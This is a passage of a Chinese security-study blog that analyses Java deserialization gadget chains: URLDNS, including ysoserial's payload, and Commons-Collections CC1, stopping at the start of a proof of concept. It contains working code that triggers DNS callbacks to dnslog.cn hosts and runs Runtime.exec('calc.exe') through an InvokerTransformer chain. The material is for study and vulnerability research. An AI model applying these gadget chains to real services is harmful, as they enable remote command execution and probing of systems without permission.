<li>writeObject() - 将对象写入输出流</li>
</ul>
</li>
</ul>
<h4 id="序列化和反序列化示例"><a href="#序列化和反序列化示例" class="headerlink" title="序列化和反序列化示例"></a>序列化和反序列化示例</h4><p>现在假设对一个hashmap对象序列化和反序列化<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    FileOutputStream fileOutputStream=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;studytest.ser&quot;</span>);</span><br><span class="line">    ObjectOutputStream outputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">    outputStream.writeObject(hashMap);</span><br><span class="line">    outputStream.close();</span><br><span class="line">    fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">    FileInputStream fileInputStream=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;studytest.ser&quot;</span>);</span><br><span class="line">    ObjectInputStream inputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">    inputStream.readObject();</span><br><span class="line">    inputStream.close();</span><br><span class="line">    fileInputStream.close();</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h3><p>调试技巧:</p>
<ul>
<li>光标放在一个类目一直按住ctrl键,鼠标左键点击可进入这个类里</li>
</ul>
<p>study1.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">study1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://35bbd1.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(url,<span class="number">123</span>);</span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        hashMap.put(url,<span class="number">111</span>);<span class="comment">//此时不会进行dns解析</span></span><br><span class="line">        f.set(url,-<span class="number">1</span>);<span class="comment">//hashcode重新设置为-1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            FileOutputStream fileOutputStream=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;studytest.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream outputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            outputStream.writeObject(hashMap);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;studytest.ser&quot;</span>);</span><br><span class="line">            ObjectInputStream inputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>==这里踩坑jdk版本,高版本是找不到这个getByName(host)的,它暖暖得下载了5个jdk最后一个成功了,是jdk-8u201==</p>
<p>链子很简单<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap::readObject()--&gt;</span><br><span class="line">Hashmap::hash()--&gt;</span><br><span class="line">java.net.URL.hashcode()</span><br><span class="line">URLStreamHandler-&gt;hashcode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress</span><br><span class="line">InetAddress.getByname(host)</span><br></pre></td></tr></table></figure></p>
<p>这里的InetAddress addr = getByName(host); 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。</p>
<p>==但是要注意一点,当我们往HashMap里加URL对象时也会自动调用一次HashMap的put方法==<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;  </span><br><span class="line"><span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里也会进行hash函数,经过一系列方法造成dns解析,我们可以通过修改hashcode的值让它不等于-1来不进行dns解析,然后在反序列化之前把hashcode改回-1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldnsTest</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException &#123;  </span><br><span class="line">HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();  </span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c282sy.dnslog.cn&quot;</span>);  </span><br><span class="line">hashMap.put(url,<span class="number">22</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时会进行dns解析</p>
<p>我们来学习一下ysoserial的payload:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>这里通过继承<code>URLStreamHandler</code>类，重写<code>openConnection()</code>和<code>getHostAddress()</code>函数，而这里重写的目的在于: <code>HashMap#put</code>时也会调用<code>getHostAddress()</code>函数进行一次<code>DNS</code>解析，这里就是通过重写的<code>getHostAddress()</code>函数来覆盖掉原函数，从而使其不进行<code>DNS</code>解析，避免在<code>Payload</code>在创建的时候进行<code>DNS</code>解析,后面反序列化时不受影响</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化之CC1链分析</title>
    <url>/2024/03/14/CC1/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>maven加依赖:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><br>jdk8u65:<a href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">https://blog.lupf.cn/articles/2022/02/19/1645283454543.html</a><br>sun包:<a href="http://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">http://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a></p>
<p>需要将sun包下载的jdk的src/share/classes/sun拷贝到jdk8u65的src文件夹里<br>IDEA的项目结构的SDKs将jdk8u65的SourcePath加上之前jdk8u65的src文件夹<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240314005929.png" alt="image.png"></p>
<h3 id="几个接口和类"><a href="#几个接口和类" class="headerlink" title="几个接口和类:"></a>几个接口和类:</h3><ul>
<li><p>org.apache.commons.collections.map.TransformedMap.java<br>对Java标准数据结构Map做一个修饰,被修饰过的Map==在添加新的元素时==将执行一个回调(实现一个Transformer接口的类)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  </span><br><span class="line"><span class="built_in">super</span>(map);  </span><br><span class="line"><span class="built_in">this</span>.keyTransformer = keyTransformer;  </span><br><span class="line"><span class="built_in">this</span>.valueTransformer = valueTransformer;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>keyTransformer是处理新元素的Key的回调,valueTransformer是处理新元素的value的回调</p>
</li>
<li><p>Transformer<br>一个接口,有一个待实现的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法类型和参数类型都是对象</p>
</li>
<li><p>ConstantTransformer.java<br>实现Transformer接口的一个类,在构造函数的时候传入对象,并在transform方法将这个对象再返回</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span>&#123;</span><br><span class="line">   <span class="built_in">super</span>();</span><br><span class="line">   iConstant=constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>作用就是包装任意一个对象,在回调的时候返回这个对象,</p>
</li>
<li><p>InvokerTransformer.java<br>实现Transformer接口的一个类,transform()时可以执行任意方法<br>三个参数:第一个是待执行的方法名,第二个是函数的参数列表的参数类型,第三个是传给这个函数的参数列表</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokeTransformer</span><span class="params">(String methodName,Class[] paramTypes,Object[] args)</span>&#123;</span><br><span class="line">   <span class="built_in">super</span>();</span><br><span class="line">   iMethodname=methodName;</span><br><span class="line">   iParamTypes=paramTypes;</span><br><span class="line">   iArgs=args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  </span><br><span class="line"><span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();  </span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);  </span><br><span class="line">  </span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;  </span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);  </span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;  </span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);  </span><br><span class="line">&#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;  </span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ChainedTransformer.java<br>实现transformer接口的一个类,它的transform方法遍历传入的Transformer列表,依次调用其中的transform方法,返回函数调用的结果object,作为下次transform方法调用的参数<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">   <span class="built_in">super</span>();</span><br><span class="line">   iTransformers = transformers;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;      </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">    object = iTransformers[i].transform(object);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> object;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这是p神的缩短版<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                                &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>流程:</p>
<p>put方法触发TransformedMap::put()<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;  </span><br><span class="line">key = transformKey(key);  </span><br><span class="line">value = transformValue(value);  </span><br><span class="line"><span class="keyword">return</span> getMap().put(key, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>transformValue()方法可以触发TransformedMap的transform方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;  </span><br><span class="line"><span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;  </span><br><span class="line"><span class="keyword">return</span> object;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">return</span> valueTransformer.transform(object);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以通过上面的decorate方法看出来,此时TransformedMap的valueTransformer是那个ChainedTransformer类,里面有危险函数,<br>这样就直接调用了ChainedTransformer的transform方法,最终返回危险函数执行的结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformedMap::put()-&gt;TransformedMap::transformValue()-&gt;transformerChain::transform()也就是ChainedTransformer::transform()-&gt;ConstantTransformer::transform()返回Runtime.getRuntime对象-&gt;InvokerTransformer::transform()返回函数调用结果弹出计算器</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们在实际情况下需要找到一个类,它的readObject()方法能有类似outMap.put()的操作</p>
<p>TransformedMap的checkSetValue()方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>可以发现它可以直接调用valueTransformer.transform()方法</p>
<p>AnnotationInvocationHandler类的readObject方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看一下for循环吧:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240314141333.png" alt=""></p>
<p>这里遍历的memberValues是经过TransformedMap修饰过的对象outMap,可以在构造函数时传入<br>构造函数:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>而那个setValue方法是怎么实现调用TransformedMap的checkSetValue方法的呢?<br>我们调试一下可以发现,在调用<code>for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</code>的<code>memberValues.entrySet()</code>方法时</p>
<p>这里的memberValues是TransformedMap,调用它的entrySet方法,但是它没有这个方法,它的父类AbstractInputCheckedMapDecorator有<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240504230020.png" alt="image.png"></p>
<p>isSetValueChecking方法默认返回true<br>EntrySet方法把TransformMap的键值对设置进去,parent设置成TransformMap<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240504230142.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240504230314.png" alt="image.png"><br>此时回到readObject()可以发现memberValue已经变成AbstractInputCheckedMapDecorator类型的变量了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240504230506.png" alt="image.png"></p>
<p>后面的setValue方法调用的也是AbstractInputCheckedMapDecorator的<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>this.parent.checkSetValue(value)</code>,这个parent调试时可以发现是构造好的TranformedMap<br>成功调用TransformedMap的checkSetValue()方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject() </span><br><span class="line">TransformedMap.entrySet() </span><br><span class="line">AbstractInputCheckedMapDecorator.setValue() </span><br><span class="line">TransformedMap.checkSetValue()</span><br><span class="line">ChainedTransformer.transform() </span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform() </span><br><span class="line">Class.getMethod() </span><br><span class="line">InvokerTransformer.transform() Runtime.getRuntime() InvokerTransformer.transform() Runtime.exec()</span><br></pre></td></tr></table></figure>
<h3 id="Poc1"><a href="#Poc1" class="headerlink" title="Poc1:"></a>Poc1:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span 